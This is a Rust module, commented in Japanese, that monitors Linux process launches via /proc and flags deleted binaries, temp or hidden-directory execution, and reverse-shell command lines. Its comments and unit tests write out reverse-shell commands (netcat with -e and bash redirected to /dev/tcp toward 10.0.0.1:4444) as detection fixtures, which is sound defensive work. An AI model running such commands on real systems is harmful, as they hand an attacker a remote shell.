//! プロセス起動監視モジュール
//!
//! `/proc` ファイルシステムを定期的にスキャンし、新しく起動されたプロセスを検知する。
//!
//! 検知対象:
//! - 削除済みバイナリからの実行（`/proc/<pid>/exe` が `(deleted)` を含む）
//! - リバースシェルパターンの検知（`nc -e`, `bash -i >& /dev/tcp` 等）
//! - 不審なパスからの実行（`/tmp`, `/dev/shm` など一時ディレクトリ）
//! - 隠しディレクトリからの実行（パスに `.` で始まるコンポーネントが含まれる）

use crate::config::ProcessExecMonitorConfig;
use crate::core::event::{EventBus, SecurityEvent, Severity};
use crate::error::AppError;
use crate::modules::{InitialScanResult, Module};
use regex::Regex;
use std::collections::{BTreeMap, HashSet};
use std::path::{Path, PathBuf};
use tokio_util::sync::CancellationToken;

/// プロセス起動の異常種別
#[derive(Debug, Clone, PartialEq, Eq)]
enum ExecAnomalyKind {
    /// 削除済みバイナリから実行されている
    DeletedBinary,
    /// リバースシェルパターンに一致
    ReverseShell,
    /// 不審なパスから実行されている
    SuspiciousPath,
    /// 隠しディレクトリから実行されている
    HiddenDirectory,
}

impl std::fmt::Display for ExecAnomalyKind {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ExecAnomalyKind::DeletedBinary => write!(f, "deleted_binary"),
            ExecAnomalyKind::ReverseShell => write!(f, "reverse_shell"),
            ExecAnomalyKind::SuspiciousPath => write!(f, "suspicious_path"),
            ExecAnomalyKind::HiddenDirectory => write!(f, "hidden_directory"),
        }
    }
}

impl ExecAnomalyKind {
    /// イベントタイプ文字列を返す
    fn event_type(&self) -> &str {
        match self {
            ExecAnomalyKind::DeletedBinary => "process_exec_deleted_binary",
            ExecAnomalyKind::ReverseShell => "process_exec_reverse_shell",
            ExecAnomalyKind::SuspiciousPath => "process_exec_suspicious_path",
            ExecAnomalyKind::HiddenDirectory => "process_exec_hidden_dir",
        }
    }

    /// 対応する Severity を返す
    fn severity(&self) -> Severity {
        match self {
            ExecAnomalyKind::DeletedBinary | ExecAnomalyKind::ReverseShell => Severity::Critical,
            ExecAnomalyKind::SuspiciousPath | ExecAnomalyKind::HiddenDirectory => Severity::Warning,
        }
    }
}

/// 検知された新規プロセスの情報
#[derive(Debug)]
struct ProcessExecInfo {
    pid: u32,
    ppid: u32,
    uid: u32,
    exe_path: String,
    cmdline: String,
    kind: ExecAnomalyKind,
}

/// プロセス起動監視モジュール
///
/// `/proc` を定期スキャンし、新しく起動されたプロセスを検知して分類・通知する。
pub struct ProcessExecMonitorModule {
    config: ProcessExecMonitorConfig,
    cancel_token: CancellationToken,
    event_bus: Option<EventBus>,
    compiled_patterns: Vec<Regex>,
}

impl ProcessExecMonitorModule {
    /// 新しいプロセス起動監視モジュールを作成する
    pub fn new(config: ProcessExecMonitorConfig, event_bus: Option<EventBus>) -> Self {
        Self {
            config,
            cancel_token: CancellationToken::new(),
            event_bus,
            compiled_patterns: Vec::new(),
        }
    }

    /// キャンセルトークンのクローンを返す
    pub fn cancel_token(&self) -> CancellationToken {
        self.cancel_token.clone()
    }

    /// `/proc` から現在の全 PID セットを取得する
    fn scan_pids() -> HashSet<u32> {
        let mut pids = HashSet::new();
        let proc_dir = match std::fs::read_dir("/proc") {
            Ok(dir) => dir,
            Err(e) => {
                tracing::warn!(error = %e, "/proc の読み取りに失敗しました");
                return pids;
            }
        };

        for entry in proc_dir {
            let entry = match entry {
                Ok(e) => e,
                Err(_) => continue,
            };

            let name = entry.file_name();
            let name_str = name.to_string_lossy();
            if let Ok(pid) = name_str.parse::<u32>() {
                pids.insert(pid);
            }
        }

        pids
    }

    /// `/proc/<pid>/exe` の readlink で実行パスを取得する
    fn read_exe_path(pid: u32) -> Option<String> {
        let exe_link = PathBuf::from(format!("/proc/{pid}/exe"));
        std::fs::read_link(&exe_link)
            .ok()
            .map(|p| p.to_string_lossy().into_owned())
    }

    /// `/proc/<pid>/cmdline` からコマンドラインを取得する
    fn read_cmdline(pid: u32) -> Option<String> {
        let cmdline_path = format!("/proc/{pid}/cmdline");
        std::fs::read(&cmdline_path).ok().map(|data| {
            data.split(|&b| b == 0)
                .filter(|s| !s.is_empty())
                .map(|s| String::from_utf8_lossy(s).into_owned())
                .collect::<Vec<_>>()
                .join(" ")
        })
    }

    /// `/proc/<pid>/status` から PPID と UID を取得する
    fn read_status(pid: u32) -> (u32, u32) {
        let status_path = format!("/proc/{pid}/status");
        let content = match std::fs::read_to_string(&status_path) {
            Ok(c) => c,
            Err(_) => return (0, 0),
        };

        let mut ppid = 0u32;
        let mut uid = 0u32;

        for line in content.lines() {
            if let Some(val) = line.strip_prefix("PPid:\t") {
                ppid = val.trim().parse().unwrap_or(0);
            } else if let Some(val) = line.strip_prefix("Uid:\t") {
                // Uid 行は "real effective saved fs" の4値
                uid = val
                    .split_whitespace()
                    .next()
                    .and_then(|v| v.parse().ok())
                    .unwrap_or(0);
            }
        }

        (ppid, uid)
    }

    /// 新規プロセスを分類する
    #[allow(clippy::too_many_arguments)]
    fn classify_process(
        pid: u32,
        exe_path: &str,
        cmdline: &str,
        ppid: u32,
        uid: u32,
        suspicious_paths: &[PathBuf],
        allowed_processes: &[String],
        compiled_patterns: &[Regex],
    ) -> Option<ProcessExecInfo> {
        // 許可リストに一致する場合はスキップ
        if allowed_processes
            .iter()
            .any(|allowed| exe_path.contains(allowed.as_str()))
        {
            return None;
        }

        // 1. 削除済みバイナリの検知（Critical）
        if exe_path.contains(" (deleted)") {
            return Some(ProcessExecInfo {
                pid,
                ppid,
                uid,
                exe_path: exe_path.to_string(),
                cmdline: cmdline.to_string(),
                kind: ExecAnomalyKind::DeletedBinary,
            });
        }

        // 2. リバースシェルパターンの検知（Critical）
        if compiled_patterns.iter().any(|re| re.is_match(cmdline)) {
            return Some(ProcessExecInfo {
                pid,
                ppid,
                uid,
                exe_path: exe_path.to_string(),
                cmdline: cmdline.to_string(),
                kind: ExecAnomalyKind::ReverseShell,
            });
        }

        let path = Path::new(exe_path);

        // 3. 不審なパスからの実行（Warning）
        if suspicious_paths.iter().any(|sp| path.starts_with(sp)) {
            return Some(ProcessExecInfo {
                pid,
                ppid,
                uid,
                exe_path: exe_path.to_string(),
                cmdline: cmdline.to_string(),
                kind: ExecAnomalyKind::SuspiciousPath,
            });
        }

        // 4. 隠しディレクトリからの実行（Warning）
        if path.components().any(|c| {
            if let std::path::Component::Normal(name) = c {
                name.to_string_lossy().starts_with('.')
            } else {
                false
            }
        }) {
            return Some(ProcessExecInfo {
                pid,
                ppid,
                uid,
                exe_path: exe_path.to_string(),
                cmdline: cmdline.to_string(),
                kind: ExecAnomalyKind::HiddenDirectory,
            });
        }

        None
    }
}

impl Module for ProcessExecMonitorModule {
    fn name(&self) -> &str {
        "process_exec_monitor"
    }

    fn init(&mut self) -> Result<(), AppError> {
        if self.config.scan_interval_secs == 0 {
            return Err(AppError::ModuleConfig {
                message: "scan_interval_secs は 0 より大きい値を指定してください".to_string(),
            });
        }

        // 正規表現パターンをコンパイル
        let mut compiled = Vec::new();
        for pattern in &self.config.suspicious_commands {
            let re = Regex::new(pattern).map_err(|e| AppError::ModuleConfig {
                message: format!("不正な正規表現パターン '{}': {}", pattern, e),
            })?;
            compiled.push(re);
        }
        self.compiled_patterns = compiled;

        tracing::info!(
            scan_interval_secs = self.config.scan_interval_secs,
            suspicious_paths = ?self.config.suspicious_paths,
            suspicious_commands_count = self.config.suspicious_commands.len(),
            allowed_processes_count = self.config.allowed_processes.len(),
            "プロセス起動監視モジュールを初期化しました"
        );

        Ok(())
    }

    async fn start(&mut self) -> Result<tokio::task::JoinHandle<()>, AppError> {
        // 初回スキャンで既存の PID を記録
        let known_pids = Self::scan_pids();
        tracing::info!(
            pid_count = known_pids.len(),
            "初回 PID スキャンが完了しました"
        );

        let suspicious_paths = self.config.suspicious_paths.clone();
        let allowed_processes = self.config.allowed_processes.clone();
        let scan_interval_secs = self.config.scan_interval_secs;
        let cancel_token = self.cancel_token.clone();
        let event_bus = self.event_bus.clone();
        let compiled_patterns = self.compiled_patterns.clone();

        let handle = tokio::spawn(async move {
            let mut interval =
                tokio::time::interval(std::time::Duration::from_secs(scan_interval_secs));
            // 最初の tick は即座に発火するのでスキップ
            interval.tick().await;

            let mut known_pids = known_pids;

            loop {
                tokio::select! {
                    _ = cancel_token.cancelled() => {
                        tracing::info!("プロセス起動監視モジュールを停止します");
                        break;
                    }
                    _ = interval.tick() => {
                        let current_pids = ProcessExecMonitorModule::scan_pids();

                        // 新規 PID を検出
                        let new_pids: Vec<u32> = current_pids
                            .difference(&known_pids)
                            .copied()
                            .collect();

                        for pid in &new_pids {
                            let exe_path = match ProcessExecMonitorModule::read_exe_path(*pid) {
                                Some(p) => p,
                                None => continue,
                            };
                            let cmdline = ProcessExecMonitorModule::read_cmdline(*pid)
                                .unwrap_or_default();
                            let (ppid, uid) = ProcessExecMonitorModule::read_status(*pid);

                            if let Some(info) = ProcessExecMonitorModule::classify_process(
                                *pid,
                                &exe_path,
                                &cmdline,
                                ppid,
                                uid,
                                &suspicious_paths,
                                &allowed_processes,
                                &compiled_patterns,
                            ) {
                                tracing::warn!(
                                    pid = info.pid,
                                    ppid = info.ppid,
                                    uid = info.uid,
                                    exe_path = %info.exe_path,
                                    cmdline = %info.cmdline,
                                    anomaly_kind = %info.kind,
                                    "不審なプロセス起動を検知しました"
                                );
                                if let Some(ref bus) = event_bus {
                                    bus.publish(
                                        SecurityEvent::new(
                                            info.kind.event_type(),
                                            info.kind.severity(),
                                            "process_exec_monitor",
                                            format!(
                                                "不審なプロセス起動を検知: PID={}, PPID={}, UID={}, パス={}, コマンド={}, 種別={}",
                                                info.pid, info.ppid, info.uid, info.exe_path, info.cmdline, info.kind
                                            ),
                                        )
                                        .with_details(format!(
                                            "pid={}, ppid={}, uid={}, exe_path={}, cmdline={}, anomaly_kind={}",
                                            info.pid, info.ppid, info.uid, info.exe_path, info.cmdline, info.kind
                                        )),
                                    );
                                }
                            }
                        }

                        if new_pids.is_empty() {
                            tracing::debug!("新規プロセスは検知されませんでした");
                        }

                        // 既知 PID セットを更新
                        known_pids = current_pids;
                    }
                }
            }
        });

        Ok(handle)
    }

    async fn stop(&mut self) -> Result<(), AppError> {
        self.cancel_token.cancel();
        Ok(())
    }

    async fn initial_scan(&self) -> Result<InitialScanResult, AppError> {
        let start = std::time::Instant::now();

        let pids = Self::scan_pids();
        let items_scanned = pids.len();
        let mut issues_found = 0;

        for pid in &pids {
            let exe_path = match Self::read_exe_path(*pid) {
                Some(p) => p,
                None => continue,
            };
            let cmdline = Self::read_cmdline(*pid).unwrap_or_default();
            let (ppid, uid) = Self::read_status(*pid);

            if Self::classify_process(
                *pid,
                &exe_path,
                &cmdline,
                ppid,
                uid,
                &self.config.suspicious_paths,
                &self.config.allowed_processes,
                &self.compiled_patterns,
            )
            .is_some()
            {
                issues_found += 1;
            }
        }

        let duration = start.elapsed();

        Ok(InitialScanResult {
            items_scanned,
            issues_found,
            duration,
            summary: format!(
                "プロセス {}件をスキャンしました（不審なプロセス起動: {}件）",
                items_scanned, issues_found
            ),
            snapshot: BTreeMap::new(),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn default_suspicious_paths() -> Vec<PathBuf> {
        vec![
            PathBuf::from("/tmp"),
            PathBuf::from("/dev/shm"),
            PathBuf::from("/var/tmp"),
        ]
    }

    fn default_compiled_patterns() -> Vec<Regex> {
        ProcessExecMonitorConfig::default_suspicious_commands()
            .iter()
            .map(|p| Regex::new(p).unwrap())
            .collect()
    }

    #[test]
    fn test_classify_deleted_binary() {
        let result = ProcessExecMonitorModule::classify_process(
            1234,
            "/usr/bin/test (deleted)",
            "/usr/bin/test",
            1,
            0,
            &default_suspicious_paths(),
            &[],
            &default_compiled_patterns(),
        );
        assert!(result.is_some());
        let info = result.unwrap();
        assert_eq!(info.kind, ExecAnomalyKind::DeletedBinary);
        assert_eq!(info.pid, 1234);
    }

    #[test]
    fn test_classify_suspicious_path() {
        let result = ProcessExecMonitorModule::classify_process(
            5678,
            "/tmp/backdoor",
            "/tmp/backdoor",
            1,
            1000,
            &default_suspicious_paths(),
            &[],
            &default_compiled_patterns(),
        );
        assert!(result.is_some());
        let info = result.unwrap();
        assert_eq!(info.kind, ExecAnomalyKind::SuspiciousPath);
    }

    #[test]
    fn test_classify_hidden_directory() {
        let result = ProcessExecMonitorModule::classify_process(
            9012,
            "/home/user/.hidden/malware",
            "/home/user/.hidden/malware",
            1,
            1000,
            &default_suspicious_paths(),
            &[],
            &default_compiled_patterns(),
        );
        assert!(result.is_some());
        let info = result.unwrap();
        assert_eq!(info.kind, ExecAnomalyKind::HiddenDirectory);
    }

    #[test]
    fn test_allowed_process_skipped() {
        let result = ProcessExecMonitorModule::classify_process(
            1234,
            "/tmp/allowed_app",
            "/tmp/allowed_app",
            1,
            0,
            &default_suspicious_paths(),
            &["/tmp/allowed_app".to_string()],
            &default_compiled_patterns(),
        );
        assert!(result.is_none());
    }

    #[test]
    fn test_classify_reverse_shell_nc() {
        let result = ProcessExecMonitorModule::classify_process(
            2345,
            "/usr/bin/nc",
            "nc 10.0.0.1 4444 -e /bin/bash",
            1,
            1000,
            &default_suspicious_paths(),
            &[],
            &default_compiled_patterns(),
        );
        assert!(result.is_some());
        let info = result.unwrap();
        assert_eq!(info.kind, ExecAnomalyKind::ReverseShell);
    }

    #[test]
    fn test_classify_reverse_shell_bash() {
        let result = ProcessExecMonitorModule::classify_process(
            2345,
            "/usr/bin/bash",
            "bash -i >& /dev/tcp/10.0.0.1/4444",
            1,
            1000,
            &default_suspicious_paths(),
            &[],
            &default_compiled_patterns(),
        );
        assert!(result.is_some());
        let info = result.unwrap();
        assert_eq!(info.kind, ExecAnomalyKind::ReverseShell);
    }

    #[test]
    fn test_classify_normal_process() {
        let result = ProcessExecMonitorModule::classify_process(
            1,
            "/usr/bin/bash",
            "/usr/bin/bash",
            0,
            0,
            &default_suspicious_paths(),
            &[],
            &default_compiled_patterns(),
        );
        assert!(result.is_none());
    }

    #[test]
    fn test_config_defaults() {
        let config = ProcessExecMonitorConfig::default();
        assert!(!config.enabled);
        assert_eq!(config.scan_interval_secs, 3);
        assert_eq!(
            config.suspicious_paths,
            vec![
                PathBuf::from("/tmp"),
                PathBuf::from("/dev/shm"),
                PathBuf::from("/var/tmp"),
            ]
        );
        assert!(!config.suspicious_commands.is_empty());
        assert!(config.allowed_processes.is_empty());
    }

    #[test]
    fn test_init_zero_interval_error() {
        let config = ProcessExecMonitorConfig {
            enabled: true,
            scan_interval_secs: 0,
            suspicious_paths: vec![],
            suspicious_commands: vec![],
            allowed_processes: vec![],
        };
        let mut module = ProcessExecMonitorModule::new(config, None);
        let result = module.init();
        assert!(result.is_err());
    }

    #[test]
    fn test_init_invalid_regex_error() {
        let config = ProcessExecMonitorConfig {
            enabled: true,
            scan_interval_secs: 3,
            suspicious_paths: vec![],
            suspicious_commands: vec!["[invalid".to_string()],
            allowed_processes: vec![],
        };
        let mut module = ProcessExecMonitorModule::new(config, None);
        let result = module.init();
        assert!(result.is_err());
    }

    #[test]
    fn test_init_valid_config() {
        let config = ProcessExecMonitorConfig::default();
        let mut module = ProcessExecMonitorModule::new(config, None);
        let result = module.init();
        assert!(result.is_ok());
        assert!(!module.compiled_patterns.is_empty());
    }

    #[tokio::test]
    async fn test_start_and_stop() {
        let config = ProcessExecMonitorConfig {
            enabled: true,
            scan_interval_secs: 3600,
            suspicious_paths: vec![PathBuf::from("/tmp")],
            suspicious_commands: vec![],
            allowed_processes: vec![],
        };
        let mut module = ProcessExecMonitorModule::new(config, None);
        module.init().unwrap();

        let cancel_token = module.cancel_token();
        module.start().await.unwrap();

        module.stop().await.unwrap();
        assert!(cancel_token.is_cancelled());
    }

    #[test]
    fn test_exec_anomaly_kind_display() {
        assert_eq!(ExecAnomalyKind::DeletedBinary.to_string(), "deleted_binary");
        assert_eq!(ExecAnomalyKind::ReverseShell.to_string(), "reverse_shell");
        assert_eq!(
            ExecAnomalyKind::SuspiciousPath.to_string(),
            "suspicious_path"
        );
        assert_eq!(
            ExecAnomalyKind::HiddenDirectory.to_string(),
            "hidden_directory"
        );
    }

    #[test]
    fn test_exec_anomaly_kind_event_type() {
        assert_eq!(
            ExecAnomalyKind::DeletedBinary.event_type(),
            "process_exec_deleted_binary"
        );
        assert_eq!(
            ExecAnomalyKind::ReverseShell.event_type(),
            "process_exec_reverse_shell"
        );
        assert_eq!(
            ExecAnomalyKind::SuspiciousPath.event_type(),
            "process_exec_suspicious_path"
        );
        assert_eq!(
            ExecAnomalyKind::HiddenDirectory.event_type(),
            "process_exec_hidden_dir"
        );
    }

    #[test]
    fn test_exec_anomaly_kind_severity() {
        assert_eq!(
            ExecAnomalyKind::DeletedBinary.severity(),
            Severity::Critical
        );
        assert_eq!(ExecAnomalyKind::ReverseShell.severity(), Severity::Critical);
        assert_eq!(
            ExecAnomalyKind::SuspiciousPath.severity(),
            Severity::Warning
        );
        assert_eq!(
            ExecAnomalyKind::HiddenDirectory.severity(),
            Severity::Warning
        );
    }

    #[tokio::test]
    async fn test_initial_scan_returns_processes() {
        let config = ProcessExecMonitorConfig {
            scan_interval_secs: 60,
            ..Default::default()
        };
        let mut module = ProcessExecMonitorModule::new(config, None);
        module.init().unwrap();

        let result = module.initial_scan().await.unwrap();
        assert!(result.items_scanned > 0);
        assert!(result.summary.contains("プロセス"));
    }

    #[test]
    fn test_deleted_binary_priority_over_suspicious_path() {
        // /tmp にある削除済みバイナリは DeletedBinary が優先
        let result = ProcessExecMonitorModule::classify_process(
            1234,
            "/tmp/malware (deleted)",
            "/tmp/malware",
            1,
            0,
            &default_suspicious_paths(),
            &[],
            &default_compiled_patterns(),
        );
        assert!(result.is_some());
        assert_eq!(result.unwrap().kind, ExecAnomalyKind::DeletedBinary);
    }
}
